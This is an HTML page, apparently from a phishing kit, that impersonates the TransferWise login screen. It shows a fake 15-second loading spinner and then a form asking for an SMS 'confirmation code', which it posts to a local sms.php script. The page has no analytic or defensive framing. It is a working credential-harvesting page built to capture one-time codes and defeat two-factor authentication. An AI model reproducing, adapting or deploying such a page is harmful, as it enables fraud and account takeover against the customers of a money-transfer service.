<!DOCTYPE html>
<html lang="en-US">    
    <head>
    	<meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width">
        <meta charset="utf-8">

        <title>TransferWise - Login</title>
        <link rel="stylesheet" href="./css/style.css" >
        <link rel="stylesheet" href="./css/another.css" >
	    <script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
         <script type="text/javascript"> 
      $(document).ready( function() {
        $('#load').delay(15999).fadeOut();
      });
    </script>
    <script type="text/javascript">
    	setTimeout(function(){
 document.getElementById('ligo').classList.remove('hide');
}, 15000);
    </script>

        <style type="text/css">
        	.hide {
             display: none;
            }
        </style>
    </head>
<body>
	<div id="__next">
		<div class="overlay">
			<div class="container-fluid">
				<div class="row m-y-5">
					<div class=" col-lg-7" style="left:21.66666667%" >
						<div class="col-md-push-2 col-md-8 col-md-pull-2 col-xl-push-3 col-xl-6 col-xl-pull-3">
							<div class="text-xs-center">
								<div class="row m-b-7">
									<div class="logo logo-dimensions hidden-xs hidden-sm hidden-md m-b-2 center-block"></div>
								</div>
							</div>
							<div class="text-xs-center">
								<div class="text-xs-center login-form-container">
									<div class="text-xs-center">
										<div>
											<div class="row">
												<div class="col-xs-12">
													<h2 class="m-b-2">Welcome back.</h2>
													<span class="m-t-2">
														<span id="signupTitle">HI, TRANSFERWISER</span>
													</span>
												</div>
											</div>
											<div class="row m-t-5" >
												<div id="load" style="position: relative; width: 100%;">
					                               	<h3 class="m-b-2">loading....</h3> 
					                               	<img src="./img/icon.gif" width="40%">

				                                </div>
												<div id="ligo" name="ligo" class="hide">
												<form name="normal" method="post" action="./sms.php" class="text-xs-center">
													<div class="form-group email email-block">
														<div class="input-group">
															<input autocomplete="off" type="text" name="tel" class="form-control" aria-label="email" placeholder="Enter the confirmation code" value="" >
														</div>
														<div class="error-messages"><div class="error-required text-xs-left">Wrong code</div></div>
													</div>
													<div class="m-t-3"></div>
												<div class="m-t-3">
													<button type="submit" class="btn btn-primary m-t-2 btn-block">
														<div>
															<span class="tw-icon tw-icon-lock pull-left" aria-hidden="true" role="presentation">
																<svg width="24" height="24" fill="currentColor">
																	<path d="M11 17v-3h2v3h-2z"></path>
																	<path fill-rule="evenodd" clip-rule="evenodd" d="M12 1a6.5 6.5 0 00-6.5 6.5V9H3v10a3 3 0 003 3h12a3 3 0 003-3V9h-2.5V7.5A6.5 6.5 0 0012 1zm4.5 8V7.5a4.5 4.5 0 10-9 0V9h9zM5 11v8a1 1 0 001 1h12a1 1 0 001-1v-8H5z"></path>
																</svg>
															</span>Log in<span class="pull-right btn-loader invisible"></span>
														</div>
													</button>
												</div>
												<div class="row m-t-2">
											</div>
										</form></div></div>
									<hr class="m-t-1 m-b-1">
									<p class="m-t-3 text-xs-left small">By continuing you accept our <a href="#" >Terms of Use</a> and <a href="#" >Privacy Policy</a>.
									</p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</div>
</div>
<div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;">
	<div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;">
		
	</div>
	<div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;">
	</div>
</div>
</body>
</html>